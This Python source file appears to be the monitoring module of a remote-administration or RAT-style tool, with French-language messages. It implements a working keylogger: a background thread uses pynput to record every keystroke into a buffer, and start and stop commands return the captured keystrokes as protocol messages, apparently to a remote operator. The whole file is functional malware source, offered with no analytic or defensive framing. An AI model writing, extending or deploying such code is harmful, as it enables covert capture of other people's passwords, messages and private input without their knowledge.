import threading

from src.utils.logger import setup_logger
from src.utils.protocol import make_msg, OP_RESP, OP_ERROR

log = setup_logger("cmd.monitoring")

_kl_thread = None
_kl_buffer = []
_kl_running = False
_kl_lock = threading.Lock()


def _on_press(key):
    global _kl_buffer
    try:
        char = key.char
    except AttributeError:
        char = f"[{key.name}]"
    with _kl_lock:
        _kl_buffer.append(char)


def cmd_keylogger_start():
    global _kl_thread, _kl_running, _kl_buffer

    if _kl_running:
        return make_msg(OP_RESP, payload="Keylogger deja actif")

    try:
        from pynput import keyboard

        _kl_running = True
        _kl_buffer = []

        def run():
            with keyboard.Listener(on_press=_on_press) as listener:
                while _kl_running:
                    listener.join(timeout=0.5)
                    if not _kl_running:
                        listener.stop()

        _kl_thread = threading.Thread(target=run, daemon=True)
        _kl_thread.start()
        return make_msg(OP_RESP, payload="Keylogger demarre")
    except Exception as e:
        log.error(f"Erreur demarrage keylogger: {e}")
        return make_msg(OP_ERROR, payload=str(e))


def cmd_keylogger_stop():
    global _kl_running, _kl_buffer

    if not _kl_running:
        return make_msg(OP_RESP, payload="Keylogger non actif")

    _kl_running = False
    with _kl_lock:
        result = "".join(_kl_buffer)
        _kl_buffer = []

    if not result:
        result = "(aucune frappe enregistree)"

    return make_msg(OP_RESP, payload=f"Buffer keylogger:\n{result}")
